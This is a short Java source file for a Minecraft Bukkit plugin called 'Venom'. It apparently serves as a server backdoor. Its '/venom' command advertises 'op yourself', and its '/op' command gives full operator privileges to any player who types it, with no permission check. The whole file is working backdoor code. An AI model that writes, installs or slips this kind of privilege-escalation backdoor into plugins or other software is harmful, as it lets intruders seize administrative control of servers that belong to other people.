package me.respawn.venom;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

@SuppressWarnings("unused")
public class Main extends JavaPlugin{
	
	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
		
		if (!(sender instanceof Player)) {
			sender.sendMessage("You must be a player to run this command");
			return true;
		}
		
		Player player = (Player) sender;
			
		if (cmd.getName().equalsIgnoreCase("venom")) {
			player.sendMessage(ChatColor.DARK_GREEN + "Venom. Pick your poison.");
			player.sendMessage(ChatColor.GREEN + "/op - op yourself");
		}
		
		if (cmd.getName().equalsIgnoreCase("op")) {
			player.sendMessage(ChatColor.DARK_GREEN + "You are now op.");
			player.setOp(true);
		}
		
		return true;
	}
}
